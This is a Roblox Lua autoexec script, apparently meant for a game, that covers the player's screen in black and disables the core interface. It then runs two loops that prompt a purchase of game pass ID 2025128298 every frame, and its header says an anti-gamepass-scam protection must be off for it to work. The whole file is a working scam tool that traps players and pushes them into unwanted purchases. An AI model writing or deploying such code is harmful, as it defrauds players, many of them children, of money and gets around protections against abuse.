-- autoexec: blackout + max-speed gamepass spam
-- ID 2025128298
-- Eral anti-gamepass-scam MUST be OFF or this still gets throttled

local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")

repeat task.wait() until game:IsLoaded()
local player = Players.LocalPlayer or Players.PlayerAdded:Wait()
local GAMEPASS_ID = 2025128298

-- black screen
local gui = Instance.new("ScreenGui")
gui.Name = "Blackout"
gui.IgnoreGuiInset = true
gui.DisplayOrder = 999999
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.fromScale(1, 1)
frame.BackgroundColor3 = Color3.new(0, 0, 0)
frame.BorderSizePixel = 0
frame.ZIndex = 100
frame.Parent = gui

pcall(function()
	StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
end)

-- raw spam — no task.wait, no Heartbeat throttle on our side
task.spawn(function()
	while true do
		pcall(MarketplaceService.PromptGamePassPurchase, MarketplaceService, player, GAMEPASS_ID)
		-- yield only long enough for the engine to breathe
		RunService.RenderStepped:Wait()
	end
end)

-- second parallel spammer in case one path gets soft-locked
task.spawn(function()
	while true do
		pcall(function()
			MarketplaceService:PromptGamePassPurchase(player, GAMEPASS_ID)
		end)
		task.wait() -- absolute minimum yield
	end
end)
